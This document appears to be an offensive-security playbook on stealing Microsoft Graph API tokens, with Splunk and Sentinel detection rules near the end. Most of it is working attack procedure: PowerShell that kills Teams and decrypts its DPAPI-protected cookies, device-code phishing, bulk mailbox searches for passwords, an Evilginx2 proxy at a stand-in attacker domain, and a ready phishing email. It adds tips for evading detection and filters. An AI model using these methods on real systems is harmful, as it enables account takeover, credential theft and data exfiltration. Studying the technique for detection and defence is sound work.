# [CA-TOKEN-004]: Graph API Token Theft

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-004 |
| **MITRE ATT&CK v18.1** | [T1528 - Steal Application Access Tokens](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | M365 (Microsoft Teams, Outlook, SharePoint) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-10-26 |
| **Affected Versions** | Windows 10+, Office 365, Teams Desktop Client (all versions with token caching) |
| **Patched In** | N/A (inherent to OAuth 2.0 architecture) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** All section numbers have been dynamically renumbered based on applicability for this technique.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Microsoft Graph API token theft is a post-compromise attack where an attacker steals or intercepts OAuth 2.0 access tokens, enabling unauthorized interaction with Microsoft 365 services on behalf of a legitimate user. Tokens can be extracted through multiple vectors: local DPAPI-encrypted cookie theft from Teams/Office applications, interception of device code authentication flows, browser-based MITM attacks, or refresh token abuse. Once obtained, tokens grant full delegated access to Microsoft Graph API endpoints (mail, chats, SharePoint, OneDrive), bypassing MFA and lasting the full token lifetime (typically 1 hour for access tokens, days/weeks for refresh tokens).

**Attack Surface:** Microsoft Teams Cookies database, browser authentication flows, OAuth token endpoints (login.microsoftonline.com), msedgewebview2.exe embedded browser process, memory of authenticated applications.

**Business Impact:** **Complete lateral movement within Microsoft 365 environment.** Attackers can read all emails accessible to the compromised user, download sensitive documents from SharePoint/OneDrive, monitor Teams conversations, send phishing from the user's email account, and pivot to other accounts by searching for credentials in messages. No user interaction is required after token theft, and detection is difficult as activities appear to originate from a trusted user account.

**Technical Context:** Token theft is stealthy and requires only local access (via prior compromise) or network position (for MITM attacks). Detection likelihood is LOW because the attacker uses legitimate, delegated API endpoints with valid tokens. However, high-volume API calls, unusual patterns (e.g., bulk mailbox searches for "password" or "admin"), and out-of-hours access can trigger anomalies. Reversibility is NONE—stolen tokens cannot be revoked individually by users, only by tenant-wide token revocation policies.

### Operational Risk

- **Execution Risk:** Medium - Requires either prior system compromise (for local extraction) or network position (for MITM). Browser-based theft using malware is the most common path.
- **Stealth:** High - API calls appear legitimate; no unusual process creation or registry modification if using extracted tokens offline.
- **Reversibility:** No - Tokens remain valid until expiration or Entra ID-wide revocation. Refresh tokens extend access indefinitely unless rotated.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.3.5 | Ensure MFA is enabled for all users (bypassed by token theft post-authentication) |
| **CIS Benchmark** | 5.1.1.1 | Ensure that 'Require device compliance' is 'Yes' for all cloud apps (token theft occurs after compliance check) |
| **DISA STIG** | ID-000520 | Implement access controls and audit logging for API endpoints |
| **CISA SCuBA** | Conditional Access Policy | Enforce token protection (requiring Primary Refresh Token with device registration) |
| **NIST 800-53** | AC-3 | Access Enforcement - API-level authorization cannot prevent stolen token use |
| **NIST 800-53** | AU-2 | Audit Events - Comprehensive logging of API activity for anomaly detection |
| **NIST 800-53** | SC-7 | Boundary Protection - API gateways and token validation |
| **GDPR** | Art. 32 | Security of Processing - Cryptographic measures for sensitive tokens; breach notification |
| **DORA** | Art. 9 | Protection and Prevention - Authentication and authorization mechanisms |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - Multi-factor authentication and monitoring of privileged access |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights - Token revocation and session management |
| **ISO 27005** | Risk Scenario | "Compromise of Authentication Credentials" and "Unauthorized Access to APIs" |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:**
  - For local DPAPI extraction: User-level access (same user context or local administrator).
  - For device code interception: Network access to login.microsoftonline.com (external attacker) or ability to intercept OAuth flow.
  - For MITM/Evilginx attacks: Man-in-the-middle network position or DNS control.

- **Required Access:**
  - Network access to login.microsoftonline.com and graph.microsoft.com.
  - For Teams token theft: File system access to %AppData%\Local\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\ (requires Teams to be closed or killed).

**Supported Versions:**
- **Windows:** Windows 10, 11, Server 2016-2025 (Teams token extraction applies to Windows clients).
- **Office/Teams:** All versions using OAuth 2.0 token caching (Teams desktop client 1.3+, Office 365 ProPlus 2016+).
- **PowerShell:** Version 5.0+ (for TokenTactics, GraphRunner modules).
- **Other Requirements:** Teams application must be installed locally for browser token extraction; MSAL (Microsoft.Identity.Client) library for token manipulation.

**Tools:**
- [GraphRunner](https://github.com/dafthack/GraphRunner) (v2.5+) - Post-exploitation Graph API toolset.
- [TokenTactics](https://github.com/rvrsh3ll/TokenTactics) (Latest) - Token refresh and conversion.
- [AADInternals](https://o365blog.com/aadinternals/) - Token retrieval and Entra ID enumeration.
- [GraphSpy](https://github.com/SygniaLabs/GraphSpy) - Token-based Graph API exploration.
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (v2.2.0+) - DPAPI key extraction for Teams cookies.
- [teams_dump](https://github.com/Gr1mmie/teams_dump) - PoC tool for extracting Teams cookies.
- [Evilginx2](https://github.com/kgretzky/evilginx2) - MITM phishing framework for token interception.

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

**Objective:** Identify if Graph API token caching is enabled and assess potential token exposure vectors.

```powershell
# Check if Teams application is installed and accessible
Test-Path "$env:APPDATA\Local\Packages\MSTeams_8wekyb3d8bbwe"

# Verify if Teams process is running (important: must be killed to access Cookies database)
Get-Process -Name ms-teams -ErrorAction SilentlyContinue | Select-Object ProcessName, Id

# Check if DPAPI can be invoked (required for Teams token decryption)
Try {
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    Write-Host "DPAPI access available"
} Catch {
    Write-Host "DPAPI access denied"
}

# Check for OAuth token locations in browser profiles (Chrome, Edge, Firefox)
$EdgePath = "$env:APPDATA\Local\Microsoft\Edge\User Data\Default"
$ChromePath = "$env:APPDATA\Local\Google\Chrome\User Data\Default"
Test-Path "$EdgePath\Cookies"
Test-Path "$ChromePath\Cookies"
```

**What to Look For:**
- Teams installation path exists and is accessible (indicates token caching is enabled).
- ms-teams.exe process is running (must be killed before accessing Cookies database).
- DPAPI is accessible from user context (if user has appropriate privileges).
- Browser Cookies databases exist in user's AppData (additional token sources).

**Version Note:** Across Windows 10, 11, and Server versions, the Teams path and token encryption mechanism remain consistent.

### Linux/Bash / CLI Reconnaissance

```bash
# Check for Teams token cache in Linux Teams (if installed)
find ~/.config/Microsoft/Teams -name "Cookies*" 2>/dev/null

# Enumerate Kerberos token cache (if using Kerberos for cross-platform auth)
klist 2>/dev/null

# Check for browser token storage in Firefox/Chromium
ls -la ~/.mozilla/firefox/*/storage/default/
ls -la ~/.config/google-chrome/Default/Cookies 2>/dev/null

# Check for Azure CLI token cache (alternative access vector)
cat ~/.azure/tokenCache.json 2>/dev/null | head -c 100
```

**What to Look For:**
- Presence of Teams token caches in ~/.config/Microsoft/Teams.
- Kerberos tickets valid for extended periods (indicates compromised token).
- Browser Cookies databases accessible in ~/.config/ directories.

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Local DPAPI-Protected Cookie Extraction (Teams Desktop)

**Supported Versions:** Windows 10, 11, Server 2019-2025 with Teams 1.3+.

#### Step 1: Obtain Local System Access & Terminate Teams Process

**Objective:** Gain file access to Teams Cookies database; Teams process must be terminated as it locks the SQLite database.

**Command (All Versions):**

```powershell
# Kill Teams process to release Cookies database lock
Stop-Process -Name ms-teams -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# Verify process is terminated
Get-Process -Name ms-teams -ErrorAction SilentlyContinue
```

**Expected Output:**
```
# No output if process successfully terminated
# If process persists, loop returns running instances
```

**What This Means:**
- Process must be terminated; running Teams keeps Cookies database in use.
- SQLite database cannot be copied/accessed while locked by Teams application.
- A 2-second delay allows file handles to be released completely.

**OpSec & Evasion:**
- Killing Teams.exe generates **Event ID 4688** (process termination) in Security log.
- Use `-Force` flag to avoid user prompts that could alert the user.
- Consider doing this during off-hours or when user is already inactive.
- Detection likelihood: **Medium** (suspicious process termination is flagged by EDR).

**Troubleshooting:**
- **Error:** "Process cannot be stopped - Access Denied"
  - **Cause:** Running as non-administrator.
  - **Fix (Windows 10-11):** Use `powershell -Verb RunAs` to elevate, then retry.
  - **Fix (Server 2019+):** Verify user is in local Administrators group; retry.

#### Step 2: Extract Cookies Database

**Objective:** Copy the encrypted Cookies database to an accessible location for decryption.

**Command:**

```powershell
# Define paths
$TeamsPath = "$env:APPDATA\Local\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView"
$CookiesSource = "$TeamsPath\Cookies"
$CookiesDest = "C:\Windows\Temp\Teams_Cookies"

# Copy Cookies database
if (Test-Path $CookiesSource) {
    Copy-Item -Path $CookiesSource -Destination $CookiesDest -Force -ErrorAction Stop
    Write-Host "[+] Cookies database copied to $CookiesDest"
} else {
    Write-Host "[-] Teams Cookies database not found at $TeamsPath"
}

# Also extract the encryption key from Local State JSON
$LocalStatePath = "$TeamsPath\Local State"
$LocalStateContent = Get-Content -Path $LocalStatePath | ConvertFrom-Json
$EncryptedKey = $LocalStateContent.os_crypt.encrypted_key

Write-Host "[+] Encrypted key extracted: $($EncryptedKey.Substring(0, 50))..."
```

**Expected Output:**
```
[+] Cookies database copied to C:\Windows\Temp\Teams_Cookies
[+] Encrypted key extracted: RFBBUEkxAAAA...
```

**What This Means:**
- Cookies file is an SQLite database containing encrypted token values.
- Local State JSON contains the DPAPI-encrypted master key (starts with "DPAPI" after base64 decode).
- The encryption key is tied to the user's DPAPI keystore.

**OpSec & Evasion:**
- Copying to C:\Windows\Temp may trigger antivirus/EDR monitoring.
- Consider using System32 folder or attacker-controlled network share instead.
- Detection likelihood: **High** (file copy to Temp is commonly monitored).

**Troubleshooting:**
- **Error:** "Cannot access Cookies - file in use"
  - **Cause:** Teams process not fully terminated.
  - **Fix:** Verify with `Get-Process -Name ms-teams`; kill remaining instances with higher privilege.

#### Step 3: Decrypt DPAPI-Protected Encryption Key

**Objective:** Decrypt the DPAPI-protected master key using Windows DPAPI APIs (requires user context).

**Command (PowerShell):**

```powershell
Add-Type -AssemblyName System.Security

$LocalStatePath = "$env:APPDATA\Local\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\Local State"
$LocalStateJson = Get-Content -Path $LocalStatePath -Raw | ConvertFrom-Json

# Extract and base64-decode the encrypted key
$EncryptedKeyBase64 = $LocalStateJson.os_crypt.encrypted_key
$EncryptedKeyBytes = [Convert]::FromBase64String($EncryptedKeyBase64)

# Skip first 5 bytes (DPAPI prefix)
$EncryptedKeyOnly = $EncryptedKeyBytes[5..($EncryptedKeyBytes.Length - 1)]

# Decrypt using DPAPI
try {
    $DecryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($EncryptedKeyOnly, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    [System.Convert]::ToBase64String($DecryptedKey) | Out-Host
    Write-Host "[+] DPAPI key decrypted successfully (32 bytes for AES-256)"
} catch {
    Write-Host "[-] DPAPI decryption failed: $_"
}
```

**Expected Output:**
```
[+] DPAPI key decrypted successfully (32 bytes for AES-256)
Kx3vL7pQ9mN2oR4sT6uV8wXyZaB5cD7eF9gH1jK3lM5nO7pQ9rS1tU3vW5xY7zA9
```

**What This Means:**
- DPAPI decryption succeeds only in the user context that encrypted the key.
- Decrypted key is 32 bytes (256 bits) for AES-256-GCM encryption.
- This key can now decrypt individual cookie values from the Cookies SQLite database.

**OpSec & Evasion:**
- DPAPI decryption generates no event logs but uses Windows APIs that EDR monitors.
- Consider performing decryption on attacker machine with stolen key bytes.
- Detection likelihood: **Low** (uses legitimate Windows DPAPI APIs).

**Troubleshooting:**
- **Error:** "DPAPI decryption failed - Access Denied"
  - **Cause:** User context has changed or DPAPI state is corrupt.
  - **Fix (Windows 10-11):** Ensure running as the original Teams user; retry.
  - **Fix (Server 2019+):** If running as SYSTEM, decryption fails; switch to user context.

#### Step 4: Extract & Decrypt Cookies from SQLite Database

**Objective:** Parse the SQLite Cookies database and decrypt individual cookie values using the decrypted AES-256 key.

**Command (PowerShell with SQL parsing):**

```powershell
# Load SQLite module (may need installation: Install-Module -Name PSSQLite)
# Alternatively, use raw byte parsing if SQLite module unavailable

# Using GraphRunner teams_dump PoC (if available)
# This tool automates the extraction and decryption process

# Manual approach: Query SQLite Cookies table
$CookiesPath = "C:\Windows\Temp\Teams_Cookies"

# Parse Cookies table for Graph API tokens (host = 'teams.microsoft.com')
# Decryption requires AES-256-GCM with nonce (first 12 bytes of encrypted value)

# Tokens will appear in the decrypted cookies as:
# MUIDB, TSREGIONCOOKIE, or Bearer tokens for teams.microsoft.com

Write-Host "[+] Use teams_dump or GraphSpy to parse and decrypt Cookies"
Write-Host "[+] Tokens will be in format: eyJ0eXA..."
```

**Expected Output:**
```
[+] Extracted token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjAxZVRydW1B...
[+] Token scope: Chat.ReadWrite Mail.Read User.Read
```

**What This Means:**
- Decrypted cookies contain access tokens valid for Microsoft Graph.
- Tokens include JWT claims (payload) with scopes, user ID, and expiration.
- Tokens are immediately usable with Graph API calls (no additional authentication required).

**OpSec & Evasion:**
- This step requires understanding of AES-256-GCM encryption (complex for manual implementation).
- Using ready-made tools (teams_dump, GraphSpy) is more reliable.
- Detection likelihood: **Low if using Python/compiled tools** (no PowerShell event logs).

**Troubleshooting:**
- **Error:** "Cannot decrypt cookie - invalid nonce"
  - **Cause:** Encryption format mismatch (v10 vs v11 Chromium format).
  - **Fix:** Implement fallback decryption using both formats.

#### Step 5: Use Stolen Token with GraphRunner

**Objective:** Leverage the extracted token to enumerate and exploit Microsoft Graph API.

**Command:**

```powershell
# Import GraphRunner module
Import-Module .\GraphRunner.ps1

# Define token variable
$tokens = @{
    "access_token" = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjAxZVRydW1B..."
    "refresh_token" = "0.AVAAp4-4Zz4n7EuI_..."
    "id_token" = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im..."
}

# Run Graph API reconnaissance
Invoke-GraphRunner -Tokens $tokens

# Alternative: Execute specific Graph API calls
Invoke-GraphRecon -Tokens $tokens
Get-AzureADUsers -Tokens $tokens
Invoke-SearchMailbox -Tokens $tokens -Keywords "password,admin,credential"
Invoke-SearchTeams -Tokens $tokens -Keywords "secret,key,token"
```

**Expected Output:**
```
[+] Connected to Microsoft Graph API
[+] Current User: user@contoso.com
[+] Available Scopes: Chat.ReadWrite, Mail.Read, User.Read

[+] Users enumerated: 245
[+] Mailbox items found: 1,234
[+] Teams messages with "password": 12
```

**What This Means:**
- Token is valid and accepted by Graph API without additional authentication.
- GraphRunner automatically uses the token to perform reconnaissance and data exfiltration.
- Scope limitations apply (e.g., if token has Mail.Read, cannot send emails; requires Mail.Send).

**OpSec & Evasion:**
- GraphRunner generates high volume of Graph API requests; easy to detect with logging.
- Consider rate-limiting requests and querying during business hours.
- Detection likelihood: **High** (bulk mailbox searches, unusual queries are flagged by SIEM).

**Troubleshooting:**
- **Error:** "Token expired"
  - **Cause:** Access token has 1-hour expiration; refresh token may be needed.
  - **Fix:** Use RefreshTo-MSGraphToken from TokenTactics with the refresh_token value.

---

### METHOD 2: Device Code Flow Interception (OAuth Phishing)

**Supported Versions:** All Entra ID tenants, any OAuth 2.0 client using device code flow.

#### Step 1: Initiate Device Code Flow

**Objective:** Start the device code authentication flow and wait for user to authenticate.

**Command (PowerShell using GraphRunner):**

```powershell
# Import GraphRunner
Import-Module .\GraphRunner.ps1

# Get tokens using device code flow (this is built into GraphRunner)
$tokens = Get-GraphTokens -ClientId "04b07795-8ddb-461a-bbee-02f9e1bf7b46" `
    -Resource "https://graph.microsoft.com" `
    -Device "Windows" `
    -Browser "Chrome"

# The user will see a device code and be prompted to authenticate at https://microsoft.com/devicelogin
# Once authenticated, the attacker's polling loop receives the tokens
```

**Expected Output:**
```
[*] Please go to https://microsoft.com/devicelogin and enter code: ABC123DEF456
[*] Waiting for authentication...
[+] User authenticated!
[+] Access Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im1...
[+] Refresh Token: 0.AVAAp4-4Zz4n7EuI_pRQ...
```

**What This Means:**
- Device code flow is designed for devices without browsers (IoT, CLI tools).
- Attacker creates a legitimate-appearing Microsoft login prompt.
- User enters device code and authenticates with their credentials (including MFA if enabled).
- Upon successful authentication, the attacker's script receives the tokens automatically.
- **User never suspects an attack occurred** (appears to be normal authentication).

**OpSec & Evasion:**
- Requires social engineering (convincing user to enter device code).
- MFA does NOT prevent this attack (MFA is satisfied by user login).
- No process creation or command-line execution on user's machine; completely client-side on attacker's device.
- Detection likelihood: **Low** (only detectable if tenant monitors for unusual device code flows).

**Troubleshooting:**
- **Error:** "Device code expired"
  - **Cause:** User takes >15 minutes to authenticate; device code expires.
  - **Fix:** Regenerate device code and provide new code to user.

#### Step 2: Validate Token Scope

**Objective:** Verify that obtained token has required scopes for the intended attack.

**Command:**

```powershell
# Decode JWT to check scopes
$token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im1..."
$parts = $token.Split('.')
$payload = [Convert]::FromBase64String($parts[1] + "==")
$claims = [System.Text.Encoding]::UTF8.GetString($payload) | ConvertFrom-Json

# Check scopes
$claims.scp

# Expected output if user consented to full permissions:
# "Mail.Read Mail.ReadWrite Chat.ReadWrite Team.Read.All ..."
```

**Expected Output:**
```
scp: "Mail.Read Mail.ReadWrite Chat.ReadWrite Team.Read.All User.ReadWrite.All"
```

**What This Means:**
- Scopes define what API endpoints the token can access.
- Broad scopes (User.Read.All, Mail.ReadWrite) indicate compromised admin or user with many consents.
- Limited scopes restrict attacker's options but still provide value.

**OpSec & Evasion:**
- Scope inspection is client-side and generates no logs.
- Detection likelihood: **Very Low**.

**Troubleshooting:**
- **Error:** "Insufficient permissions"
  - **Cause:** User didn't consent to required scopes.
  - **Fix:** Modify phishing prompt to request additional scopes; have user re-authenticate.

#### Step 3: Exfiltrate Data Using Stolen Token

**Objective:** Execute Graph API queries to extract sensitive information.

**Command:**

```powershell
# Define token
$token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im1..."

# Create authorization header
$authHeader = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}

# Example 1: Search all emails for credentials
$searchQuery = @{
    "requests" = @(
        @{
            "entityTypes" = @("message")
            "query" = "subject:password OR body:admin OR body:secret OR body:API_KEY"
        }
    )
} | ConvertTo-Json

Invoke-WebRequest -Uri "https://graph.microsoft.com/v1.0/search/query" `
    -Headers $authHeader `
    -Method POST `
    -Body $searchQuery -OutFile "C:\Temp\search_results.json"

# Example 2: Enumerate all users in tenant
Invoke-WebRequest -Uri "https://graph.microsoft.com/v1.0/users?`$select=id,userPrincipalName,jobTitle,officeLocation" `
    -Headers $authHeader `
    -Method GET -OutFile "C:\Temp\users.json"

# Example 3: Download all OneDrive files
Invoke-WebRequest -Uri "https://graph.microsoft.com/v1.0/me/drive/root/children" `
    -Headers $authHeader `
    -Method GET -OutFile "C:\Temp\onedrive_files.json"
```

**Expected Output:**
```json
{
  "value": [
    {
      "id": "AQMkADEzYjE1NjA1LWZiZTAtNGYyZS04MjAwLTA4Njg5NzJjNzhjZQBGAAADnmFPX7_AAAA==",
      "subject": "URGENT: Database password - admin_user / P@ssw0rd2024!",
      "from": "admin@contoso.com",
      "bodyPreview": "Here is the production database password..."
    }
  ]
}
```

**What This Means:**
- Graph API searches return matching emails, files, and conversations.
- Attacker can bulk download sensitive documents without user awareness.
- Queries are logged to Microsoft Graph Activity logs but appear legitimate (user's own token).

**OpSec & Evasion:**
- High-volume API requests (>1000 requests/minute) may trigger throttling (429 errors).
- Spread requests over time and vary query types to avoid pattern detection.
- Detection likelihood: **High** (keyword-based search for "password", "admin", "secret" triggers anomalies).

**Troubleshooting:**
- **Error:** "HTTP 429 - Too Many Requests"
  - **Cause:** Rate limiting activated.
  - **Fix:** Wait 60 seconds and retry with lower request rate; implement exponential backoff.

---

### METHOD 3: MITM/Evilginx2 OAuth Token Interception

**Supported Versions:** All OAuth 2.0 flows, browser-based authentication.

#### Step 1: Set Up Evilginx2 MITM Proxy

**Objective:** Deploy Evilginx2 phishing server to intercept OAuth authentication flow.

**Command (on attacker VPS):**

```bash
# Install Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# Create phishing config for Microsoft OAuth
cat > config.yaml <<EOF
{
  "name": "microsoft",
  "auth_url": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize",
  "token_url": "https://login.microsoftonline.com/common/oauth2/v2.0/token",
  "redirect_url": "https://evilginx.attacker.com/callback",
  "scopes": ["https://graph.microsoft.com/.default"],
  "username_field": "loginEmail",
  "password_field": "passwd"
}
EOF

# Start Evilginx2 server
./evilginx2 -p config.yaml -l 0.0.0.0:443 -c /path/to/tls/cert.pem -k /path/to/tls/key.pem
```

**Expected Output:**
```
[*] Evilginx2 v2.3.0 started on 0.0.0.0:443
[+] Config loaded: microsoft
[+] Phishing page ready at: https://evilginx.attacker.com/login
```

**What This Means:**
- Evilginx2 creates a fake Microsoft login page that mirrors the legitimate site.
- All authentication traffic is relayed to Microsoft but also captured on the attacker's server.
- When user authenticates, both the attacker and Microsoft receive the authentication.

**OpSec & Evasion:**
- TLS certificate must match the phishing domain (self-signed certs trigger browser warnings).
- Use Let's Encrypt for free valid certificates.
- Detection likelihood: **Medium** (DNS filtering can detect phishing domains; HTTPS interception requires proxy setup).

**Troubleshooting:**
- **Error:** "Certificate verification failed"
  - **Cause:** User's browser rejects self-signed or mismatched certificates.
  - **Fix:** Use valid certificate matching the domain; educate user to click "Proceed" if necessary.

#### Step 2: Create Social Engineering Lure

**Objective:** Convince users to visit the phishing URL.

**Command (Email phishing example):**

```html
Subject: ACTION REQUIRED: Verify Your Microsoft Account Security

<p>Dear User,</p>

<p>For security reasons, we need you to verify your Microsoft account. 
Please click the link below to confirm your identity:</p>

<a href="https://evilginx.attacker.com/login">Verify Account Now</a>

<p>If you do not complete this verification, your account access may be suspended.</p>

<p>Microsoft Security Team</p>
```

**Expected Output:**
```
User clicks link → Evilginx phishing page → User enters credentials → Evilginx captures auth → Forwards to Microsoft
→ Microsoft authenticates user → OAuth code returned to Evilginx → Evilginx exchanges code for tokens
→ Attacker now possesses access_token + refresh_token
```

**What This Means:**
- No technical exploit required; pure social engineering.
- User authenticates successfully (no broken page); user continues to real Microsoft page.
- User has no indication anything unusual occurred.

**OpSec & Evasion:**
- Email domain spoofing (From: security@microsoft.com) requires DKIM/SPF bypass or compromised mail server.
- Consider using compromised legitimate domain or internal phishing from previously compromised user account.
- Detection likelihood: **High** (phishing detection via email gateway + user awareness).

**Troubleshooting:**
- **Error:** "Email blocked by spam filter"
  - **Cause:** Phishing email detected by Microsoft Defender for Office 365.
  - **Fix:** Use obfuscation, URL shorteners, or compromised domain to bypass filters.

#### Step 3: Extract Tokens from Evilginx Logs

**Objective:** Retrieve captured tokens from Evilginx2 log files.

**Command:**

```bash
# Evilginx2 logs captured sessions
cat ~/.evilginx2/logs/session_log.txt

# Output:
# [2025-01-08 14:32:10] Session captured for user@contoso.com
# access_token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im1...
# refresh_token: 0.AVAAp4-4Zz4n7EuI_pRQ...
# id_token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im...

# Extract tokens
grep "access_token:" ~/.evilginx2/logs/session_log.txt > tokens.txt
```

**Expected Output:**
```
access_token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im1...
refresh_token: 0.AVAAp4-4Zz4n7EuI_pRQ...
```

**What This Means:**
- All tokens captured by Evilginx are now in attacker's possession.
- These tokens are valid and can be used immediately with Graph API calls.

**OpSec & Evasion:**
- Evilginx logs are stored locally on attacker VPS; consider encrypting or deleting logs after use.
- Detection likelihood: **Low** (attacker-controlled infrastructure).

**Troubleshooting:**
- **Error:** "No sessions captured"
  - **Cause:** Users never clicked phishing link or browser blocked MITM.
  - **Fix:** Improve social engineering; use alternative phishing vector.

#### Step 4: Use Captured Tokens with GraphRunner (Same as Method 1, Step 5)

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** Atomic Red Team does not have a specific test for Graph API token theft via DPAPI extraction.
- **Alternative:** Use Atomic Red Team test T1528.001 (Steal Application Access Tokens - Browser Session) as a conceptual match.
- **Recommendation:** Develop custom Atomic test for Teams DPAPI decryption and Graph API token usage.

**PoC Verification Command:**

```powershell
# Minimal PoC to verify token extraction and Graph API access
# This should only be executed in authorized test environments

# Step 1: Extract Teams cookies (requires Teams to be closed)
$TeamsPath = "$env:APPDATA\Local\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView"
if (Test-Path "$TeamsPath\Cookies") {
    Write-Host "[+] Teams Cookies database found - extraction is possible"
} else {
    Write-Host "[-] Teams not installed or Cookies database not found"
}

# Step 2: Verify Graph API endpoint accessibility
$GraphEndpoint = "https://graph.microsoft.com/v1.0/me"
Try {
    Invoke-WebRequest -Uri $GraphEndpoint -ErrorAction Stop | Select-Object StatusCode
    Write-Host "[+] Graph API endpoint accessible"
} Catch {
    Write-Host "[-] Graph API not accessible: $($_.Exception.Message)"
}
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: Unusual Graph API Bulk Search Queries

**Rule Configuration:**
- **Required Index:** azure_activity, main
- **Required Sourcetype:** azure:aad:signin, azure_activity:audit
- **Required Fields:** properties.requestUri, properties.requestMethod, properties.initiatedBy, timestamp
- **Alert Threshold:** >5 search queries within 10 minutes from same user
- **Applies To Versions:** All

**SPL Query:**

```spl
index=azure_activity source=MicrosoftGraphActivityLogs RequestMethod=POST 
    RequestUriPath="/search/query" 
| stats count, values(RequestUri), values(UserId) by UserId, TimeGenerated 
| where count > 5
| eval time_diff=TimeGenerated 
| delta time_diff p=1 
| where delta < 600 
| rename UserId as user_id, count as query_count
```

**What This Detects:**
- Multiple Graph API search queries from same user in short time window (10 minutes).
- Typical legitimate usage: 0-1 searches/hour; attackers perform 10-50+ searches in minutes.
- Indicators: Bulk searches for keywords like "password", "admin", "secret", "API_key".

**Manual Configuration Steps:**

1. Log into **Splunk Web** → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to: *Custom* → `search | stats count | where count > 5`
6. Configure **Action** → Send email to SOC with alert context
7. Save as: "Graph API Bulk Search - Token Theft Detection"

**False Positive Analysis:**
- **Legitimate Activity:** Compliance scanning tools (e.g., Varonis, Tenable) may generate bulk searches.
- **Benign Tools:** eDiscovery tools in Exchange may perform graph searches for legal holds.
- **Tuning:** Exclude known eDiscovery service principals with `| where UserId != "eDiscovery_*"`.

---

### Rule 2: Graph API Access from Unusual Source IP

**Rule Configuration:**
- **Required Index:** azure_activity
- **Required Sourcetype:** azure:aad:signin
- **Required Fields:** SourceIp, UserId, UserAgent, AppId
- **Alert Threshold:** Graph API access from IP address never seen for this user before
- **Applies To Versions:** All

**SPL Query:**

```spl
index=azure_activity source=MicrosoftGraphActivityLogs AppId="00000003-0000-0000-c000-000000000000" 
| stats values(SourceIp), values(UserAgent) by UserId 
| join UserId [search index=azure_activity source=MicrosoftGraphActivityLogs AppId="00000003-0000-0000-c000-000000000000" 
    earliest=-30d 
    | stats values(SourceIp) as historical_ips by UserId] 
| eval is_new_ip=if(match(SourceIp, historical_ips), "no", "yes") 
| search is_new_ip=yes
```

**What This Detects:**
- Graph API access from IP address not previously associated with the user (past 30 days).
- High-risk indicator: Token theft from compromised device or external attacker.
- Legitimate reasons: User traveling, VPN change, or using new device.

**Manual Configuration Steps:**

1. Go to **Splunk Web** → **Search & Reporting** → **New Alert**
2. Paste the SPL query
3. Set frequency to **Every 1 hour**
4. Configure action to email SOC with user and IP details

**False Positive Analysis:**
- **Legitimate Activity:** User traveling internationally, changing ISP, or using company VPN.
- **Tuning:** Create allowlist of known VPN ranges and travel locations per user role.

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Bulk Mailbox Search via Graph API

**Rule Configuration:**
- **Required Table:** MicrosoftGraphActivityLogs
- **Required Fields:** RequestUri, RequestMethod, UserId, TimeGenerated, UserAgent
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All Entra ID/Office 365 tenants

**KQL Query:**

```kusto
MicrosoftGraphActivityLogs
| where RequestUriPath startswith "/search/query" and RequestMethod == "POST"
| extend RequestBody = parse_json(RequestBody)
| where RequestBody.requests[0].query contains "password" 
    or RequestBody.requests[0].query contains "admin" 
    or RequestBody.requests[0].query contains "secret"
    or RequestBody.requests[0].query contains "API_KEY"
    or RequestBody.requests[0].query contains "credential"
| summarize SearchCount=count(), SearchQueries=make_set(RequestBody.requests[0].query) by UserId, TimeGenerated
| where SearchCount > 3
| project TimeGenerated, UserId, SearchCount, SearchQueries
```

**What This Detects:**
- Searches for sensitive keywords ("password", "admin", "secret") via Graph API.
- Typical for data exfiltration after token theft.
- Red Team fingerprint: Multiple searches in short time window.

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
